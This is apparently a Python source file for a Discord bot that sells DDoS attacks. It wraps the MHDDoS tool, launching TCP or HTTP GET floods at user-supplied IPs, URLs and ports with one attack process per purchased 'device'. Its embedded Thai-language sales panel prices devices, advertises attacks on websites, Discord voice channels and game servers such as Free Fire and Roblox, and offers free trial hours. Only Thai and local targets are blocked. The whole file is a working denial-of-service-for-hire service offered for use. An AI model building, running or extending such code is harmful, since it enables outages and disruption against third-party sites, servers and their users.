#!/usr/bin/env python3
# main.py — Discord DDoS Bot (MHDDoS Wrapper)
# Python 3.12+ | discord.py 2.x | VPS Deployment
# Run: python3 main.py

import discord
from discord.ext import commands, tasks
from discord import app_commands
import asyncio
import json
import os
import re
import socket
import subprocess
import sys
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path
import aiohttp

# ═══════════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════════

BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"          # ← ใส่ token บอทตรงนี้
OWNER_ID = 1488103702488154173             # ← คนเดียวที่ใช้ !ddos / !device / !b / !ub ได้
PROJECT_DIR = Path(__file__).parent
START_PY = PROJECT_DIR / "start.py"
DATA_FILE = PROJECT_DIR / "data.json"
PROXY_FILE = PROJECT_DIR / "proxy.txt"     # optional — ถ้ามีจะใช้

# สีชมพู
PINK = 0xFF69B4

# ═══════════════════════════════════════════════════════════
#  EMOJI — จากเซิร์ฟเวอร์ dj
# ═══════════════════════════════════════════════════════════

E_DDOS_TITLE   = "<a:1000035910:1559173862820810803>"
E_BULLET       = "<:1000035915:1559174417097953340>"
E_STAR         = "<a:1000038732:1559175829001338980>"
E_RULE         = "<:1000038740:1559179488389242950>"
E_GIFT         = "<a:1000035726:1559180464487407707>"
E_RESULT_TITLE = "<a:1000035744:1559183157532565524>"
E_TARGET       = "<:1000038745:1559183912113148065>"
E_SPEED        = "<:1000038746:1559184363021795369>"
E_DEVICE       = "<:1000038748:1559185433458385019>"
E_BTN          = "<a:1000038742:1559181609528205372>"

IMG_PANEL  = "https://cdn.discordapp.com/attachments/1488104101085577229/1559181189175312466/ef8e34b79db57b50c3c29471d10c4eef.jpg?ex=6ace2423&is=6accd2a3&hm=b1d5fc7fc89993d53008fa4e8aed6311579ce453741c7e29015c5c7d9ffe95e2&"
IMG_RESULT = "https://cdn.discordapp.com/attachments/1488104101085577229/1559186792522190930/137316d06f5fe8f5a2b243c67919345f.jpg?ex=6ace295b&is=6accd7db&hm=0567a79045644d8d92cd84d2a9ccf48737e9ef19bce3acd1b00f66fb37946c2e&"

# ═══════════════════════════════════════════════════════════
#  DATA LAYER
# ═══════════════════════════════════════════════════════════

_default_data = {
    "devices": {},      # user_id -> {"count": int, "expires": iso8601 | "TH"}
    "warnings": {},     # user_id -> int
    "banned": [],       # [user_id]
}

def load_data() -> dict:
    if DATA_FILE.exists():
        try:
            with open(DATA_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return json.loads(json.dumps(_default_data))

def save_data(d: dict):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(d, f, indent=2, ensure_ascii=False)

DATA = load_data()

# ═══════════════════════════════════════════════════════════
#  HELPERS
# ═══════════════════════════════════════════════════════════

def user_devices(user_id: int) -> int:
    entry = DATA["devices"].get(str(user_id))
    if not entry:
        return 0
    exp = entry.get("expires")
    if exp and exp != "TH":
        try:
            if datetime.fromisoformat(exp) < datetime.now(timezone.utc):
                del DATA["devices"][str(user_id)]
                save_data(DATA)
                return 0
        except Exception:
            pass
    return entry.get("count", 0)

def set_devices(user_id: int, count: int, expires: str | None):
    DATA["devices"][str(user_id)] = {
        "count": count,
        "expires": expires,
    }
    save_data(DATA)

def add_warning(user_id: int) -> int:
    uid = str(user_id)
    DATA["warnings"][uid] = DATA["warnings"].get(uid, 0) + 1
    save_data(DATA)
    return DATA["warnings"][uid]

def get_warnings(user_id: int) -> int:
    return DATA["warnings"].get(str(user_id), 0)

def is_banned(user_id: int) -> bool:
    return str(user_id) in DATA["banned"]

def ban_user(user_id: int):
    uid = str(user_id)
    if uid not in DATA["banned"]:
        DATA["banned"].append(uid)
    DATA["warnings"].pop(uid, None)
    save_data(DATA)

def unban_user(user_id: int):
    uid = str(user_id)
    if uid in DATA["banned"]:
        DATA["banned"].remove(uid)
    DATA["warnings"].pop(uid, None)
    save_data(DATA)

def is_th_target(host: str) -> bool:
    """ตรวจว่าเป็น .th หรือ local IP หรือไม่"""
    h = host.lower().strip()
    if h.endswith(".th") or ".th:" in h or ".co.th" in h or ".go.th" in h or ".ac.th" in h or ".or.th" in h:
        return True
    if h in ("127.0.0.1", "localhost", "0.0.0.0", "::1"):
        return True
    if h.startswith("10.") or h.startswith("192.168.") or h.startswith("172."):
        return True
    return False

def resolve_ip(host: str) -> str:
    try:
        return socket.gethostbyname(host)
    except Exception:
        return host

def reverse_dns(ip: str) -> str:
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return ip

def parse_time(s: str) -> str | None:
    """คืนค่า ISO8601 ถาวร → 'TH'"""
    s = s.strip().lower()
    if s == "th" or s == "ถาวร":
        return "TH"
    m = re.match(r"^(\d+)\s*([hd])$", s)
    if not m:
        return None
    n = int(m.group(1))
    unit = m.group(2)
    delta = timedelta(hours=n) if unit == "h" else timedelta(days=n)
    return (datetime.now(timezone.utc) + delta).isoformat()

def fmt_remaining(expires: str | None) -> str:
    if not expires or expires == "TH":
        return "ถาวร"
    try:
        dt = datetime.fromisoformat(expires)
        rem = dt - datetime.now(timezone.utc)
        if rem.total_seconds() <= 0:
            return "หมดอายุ"
        h = int(rem.total_seconds() // 3600)
        m = int((rem.total_seconds() % 3600) // 60)
        return f"{h}h {m}m"
    except Exception:
        return "?"

# ═══════════════════════════════════════════════════════════
#  BOT
# ═══════════════════════════════════════════════════════════

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix="!", intents=intents)

# active attacks: user_id -> {"proc": Popen, "task": asyncio.Task}
ACTIVE: dict[int, dict] = {}

# ═══════════════════════════════════════════════════════════
#  VIEWS
# ═══════════════════════════════════════════════════════════

class DDOSModal(discord.ui.Modal, title="DDOS ATTACK"):
    target = discord.ui.TextInput(
        label="IP / URL (เป้าหมาย)",
        placeholder="เช่น example.com หรือ 1.2.3.4",
        required=True,
        max_length=200,
    )
    port = discord.ui.TextInput(
        label="Port (1-65535)",
        placeholder="80",
        required=True,
        max_length=5,
    )
    duration = discord.ui.TextInput(
        label="Time (สูงสุด 250 วิ)",
        placeholder="60",
        required=True,
        max_length=3,
    )
    device = discord.ui.TextInput(
        label="Device (เครื่อง)",
        placeholder="1",
        required=True,
        max_length=3,
    )

    async def on_submit(self, interaction: discord.Interaction):
        uid = interaction.user.id

        # ── ban check ──
        if is_banned(uid):
            await interaction.response.send_message(
                embed=discord.Embed(
                    description="คุณโดนแบนไม่ให้ใช้งานบอท",
                    color=PINK,
                ),
                ephemeral=True,
            )
            return

        # ── parse input ──
        try:
            port_n = int(self.port.value)
            if not (1 <= port_n <= 65535):
                raise ValueError
        except ValueError:
            await interaction.response.send_message(
                embed=discord.Embed(description="Port ต้องอยู่ระหว่าง 1-65535", color=PINK),
                ephemeral=True,
            )
            return

        try:
            dur = int(self.duration.value)
            if not (1 <= dur <= 250):
                raise ValueError
        except ValueError:
            await interaction.response.send_message(
                embed=discord.Embed(description="Time ต้องอยู่ระหว่าง 1-250 วินาที", color=PINK),
                ephemeral=True,
            )
            return

        try:
            dev_req = int(self.device.value)
            if dev_req < 1:
                raise ValueError
        except ValueError:
            await interaction.response.send_message(
                embed=discord.Embed(description="Device ต้องมากกว่า 0", color=PINK),
                ephemeral=True,
            )
            return

        # ── .th check ──
        host = self.target.value.strip()
        if is_th_target(host):
            w = add_warning(uid)
            if w >= 3:
                ban_user(uid)
                await interaction.response.send_message(
                    embed=discord.Embed(
                        title="🚫 BANNED",
                        description=f"ห้ามยิง .th ไอ้เอ๋อ เตือนรอบที่ {w}\n**คุณโดนแบนไม่ให้ใช้งานบอทแล้ว**",
                        color=PINK,
                    ),
                    ephemeral=True,
                )
            else:
                await interaction.response.send_message(
                    embed=discord.Embed(
                        title="⚠️ WARNING",
                        description=f"ห้ามยิง .th ไอ้เอ๋อ เตือนรอบที่ {w}/3",
                        color=PINK,
                    ),
                    ephemeral=True,
                )
            return

        # ── device check ──
        owned = user_devices(uid)
        if owned < 1:
            await interaction.response.send_message(
                embed=discord.Embed(
                    description="คุณไม่มี device เหลืออยู่ ต้องมีอย่างน้อย 1 เครื่อง",
                    color=PINK,
                ),
                ephemeral=True,
            )
            return
        if dev_req > owned:
            await interaction.response.send_message(
                embed=discord.Embed(
                    description=f"ยิงไม่ได้ มี {owned} เครื่อง แต่กรอกไป {dev_req}",
                    color=PINK,
                ),
                ephemeral=True,
            )
            return

        # ── target resolve ──
        target_input = host
        ip = resolve_ip(host.split(":")[0])
        is_url = host.startswith("http://") or host.startswith("https://")
        if is_url:
            method = "GET"
            target_full = host
        else:
            method = "TCP"
            target_full = f"{ip}:{port_n}"

        # ── result embed ──
        embed = discord.Embed(title=f"{E_RESULT_TITLE} DDOS BY C", color=PINK)
        target_line = f"{E_TARGET} **Target:** `{target_input}`"
        if not is_url:
            target_line += f" : `{reverse_dns(ip)}`"
        embed.add_field(name="", value=target_line, inline=False)
        embed.add_field(
            name="",
            value=f"{E_SPEED} **Speed Web:** `กำลังวัด...`",
            inline=False,
        )
        embed.add_field(
            name="",
            value=f"{E_DEVICE} **Device:** `{dev_req}`",
            inline=False,
        )
        embed.add_field(
            name="",
            value=f"{E_DEVICE} **Time:** `{dur}`",
            inline=False,
        )
        embed.set_image(url=IMG_RESULT)

        await interaction.response.send_message(embed=embed)
        msg = await interaction.original_response()

        # ── start attack ──
        task = asyncio.create_task(run_attack(uid, method, target_full, dev_req, dur, msg))
        ACTIVE[uid] = {"task": task}

async def run_attack(uid: int, method: str, target: str, devices: int, duration: int, msg: discord.Message):
    """Launch MHDDoS subprocesses and update embed every 3s."""
    procs = []
    try:
        # spawn one process per device (each with 10 threads)
        for _ in range(devices):
            cmd = [sys.executable, str(START_PY), method, target, "10", str(duration)]
            if PROXY_FILE.exists():
                cmd.append(str(PROXY_FILE))
            p = subprocess.Popen(
                cmd,
                cwd=str(PROJECT_DIR),
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            procs.append(p)

        start = time.monotonic()
        speed = "—"
        async with aiohttp.ClientSession() as session:
            while True:
                elapsed = time.monotonic() - start
                if elapsed >= duration:
                    break
                remaining = max(0, int(duration - elapsed))

                # measure speed
                try:
                    t0 = time.monotonic()
                    url = target if target.startswith("http") else f"http://{target}"
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=5), ssl=False) as r:
                        await r.read()
                    ms = (time.monotonic() - t0) * 1000
                    speed = f"{ms:.0f} ms"
                except Exception:
                    speed = "timeout"

                embed = discord.Embed(title=f"{E_RESULT_TITLE} DDOS BY C", color=PINK)
                tl = f"{E_TARGET} **Target:** `{target}`"
                embed.add_field(name="", value=tl, inline=False)
                embed.add_field(name="", value=f"{E_SPEED} **Speed Web:** `{speed}`", inline=False)
                embed.add_field(name="", value=f"{E_DEVICE} **Device:** `{devices}`", inline=False)
                embed.add_field(name="", value=f"{E_DEVICE} **Time:** `{remaining}`", inline=False)
                embed.set_image(url=IMG_RESULT)
                try:
                    await msg.edit(embed=embed)
                except Exception:
                    pass

                await asyncio.sleep(3)

        # final
        embed = discord.Embed(title=f"{E_RESULT_TITLE} DDOS BY C", color=PINK)
        embed.add_field(name="", value=f"{E_TARGET} **Target:** `{target}`", inline=False)
        embed.add_field(name="", value=f"{E_SPEED} **Speed Web:** `{speed}`", inline=False)
        embed.add_field(name="", value=f"{E_DEVICE} **Device:** `{devices}`", inline=False)
        embed.add_field(name="", value=f"{E_DEVICE} **Time:** `0`", inline=False)
        embed.set_image(url=IMG_RESULT)
        try:
            await msg.edit(embed=embed)
        except Exception:
            pass

    finally:
        for p in procs:
            try:
                p.kill()
            except Exception:
                pass
        ACTIVE.pop(uid, None)

class DDOSPanel(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="", emoji=E_BTN, style=discord.ButtonStyle.secondary)
    async def open_modal(self, interaction: discord.Interaction, button: discord.ui.Button):
        if is_banned(interaction.user.id):
            await interaction.response.send_message(
                embed=discord.Embed(description="คุณโดนแบนไม่ให้ใช้งานบอท", color=PINK),
                ephemeral=True,
            )
            return
        await interaction.response.send_modal(DDOSModal())

# ═══════════════════════════════════════════════════════════
#  COMMANDS
# ═══════════════════════════════════════════════════════════

@bot.command(name="ddos")
async def cmd_ddos(ctx: commands.Context):
    if ctx.author.id != OWNER_ID:
        await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
        return

    embed = discord.Embed(
        title=f"{E_DDOS_TITLE} DDOS ATTACK",
        color=PINK,
    )
    embed.description = (
        f"{E_BULLET} **หากสนใจกด TK มา**\n"
        f"-. เรทราคา device ละ 65B TH รับเเค่ซองทรูมันนี่\n"
        f"-. device สูงสุด 10 เครื่อง\n\n"
        f"{E_STAR} **กฎการใช้**\n"
        f"-. ห้ามยิง .th หรือเว็บที่เกี่ยวกับรัฐ : หน่วยงาน\n"
        f"-. ห้ามยิง Local IP พวกแบบ 127.0.0.1\n"
        f"-. ถ้าโดนเตือนครบ 5 ครั้งจะโดนเเบนไม่ให้ใช้\n\n"
        f"{E_RULE} **สามารถยิงได้: เบื้องต้น**\n"
        f"-. ยิงห้องเสียงดิสได้\n"
        f"-. เว็บต่างๆ พวกแบบ .com หรืออะไรต่างๆ ได้\n"
        f"-. เซิฟเกมต่างๆ เช่น ฟีฟาย โรบอค\n\n"
        f"{E_GIFT} มี Ddos เเจกฟรีให้ใช้ 3 ชม ทุก 3 วัน นะงับ"
    )
    embed.set_image(url=IMG_PANEL)
    await ctx.send(embed=embed, view=DDOSPanel())

@bot.command(name="device")
async def cmd_device(ctx: commands.Context, member: discord.Member = None, amount: str = None, duration: str = None):
    if ctx.author.id != OWNER_ID:
        await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
        return
    if member is None or amount is None:
        await ctx.send("使用方法: `!device @user +N 1h` หรือ `!device @user -N`")
        return

    try:
        sign = amount[0]
        num = int(amount[1:]) if len(amount) > 1 else 0
    except Exception:
        await ctx.send("จำนวนไม่ถูกต้อง")
        return

    if sign not in "+-":
        await ctx.send("ต้องขึ้นต้นด้วย + หรือ -")
        return

    current = user_devices(member.id)

    if sign == "+":
        exp = parse_time(duration) if duration else "TH"
        if exp is None:
            await ctx.send("เวลาไม่ถูกต้อง ใช้ `1h`, `1d`, หรือ `TH`")
            return
        new_count = current + num
        set_devices(member.id, new_count, exp)
        await ctx.send(
            f"เพิ่ม **{num}** device ให้ {member.mention} "
            f"(รวม {new_count}) — หมดอายุ: {fmt_remaining(exp)}"
        )
    else:
        new_count = max(0, current - num)
        set_devices(member.id, new_count, None)
        await ctx.send(f"ลบ **{num}** device จาก {member.mention} (เหลือ {new_count})")

@bot.command(name="b")
async def cmd_ban(ctx: commands.Context, member: discord.Member = None):
    if ctx.author.id != OWNER_ID:
        await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
        return
    if member is None:
        await ctx.send("使用方法: `!b @user`")
        return
    ban_user(member.id)
    await ctx.send(f"แบน {member.mention} เรียบร้อย")

@bot.command(name="ub")
async def cmd_unban(ctx: commands.Context, member: discord.Member = None):
    if ctx.author.id != OWNER_ID:
        await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
        return
    if member is None:
        await ctx.send("使用方法: `!ub @user`")
        return
    unban_user(member.id)
    await ctx.send(f"ปลดแบน {member.mention} เรียบร้อย")

# ═══════════════════════════════════════════════════════════
#  TASKS
# ═══════════════════════════════════════════════════════════

@tasks.loop(minutes=1)
async def expiry_check():
    changed = False
    now = datetime.now(timezone.utc)
    for uid, entry in list(DATA["devices"].items()):
        exp = entry.get("expires")
        if exp and exp != "TH":
            try:
                if datetime.fromisoformat(exp) < now:
                    del DATA["devices"][uid]
                    changed = True
            except Exception:
                pass
    if changed:
        save_data(DATA)

# ═══════════════════════════════════════════════════════════
#  STARTUP
# ═══════════════════════════════════════════════════════════

@bot.event
async def on_ready():
    print(f"[VANTA] logged in as {bot.user} (ID: {bot.user.id})")
    print(f"[VANTA] owner: {OWNER_ID}")
    print(f"[VANTA] project: {PROJECT_DIR}")
    if not expiry_check.is_running():
        expiry_check.start()

if __name__ == "__main__":
    bot.run(BOT_TOKEN)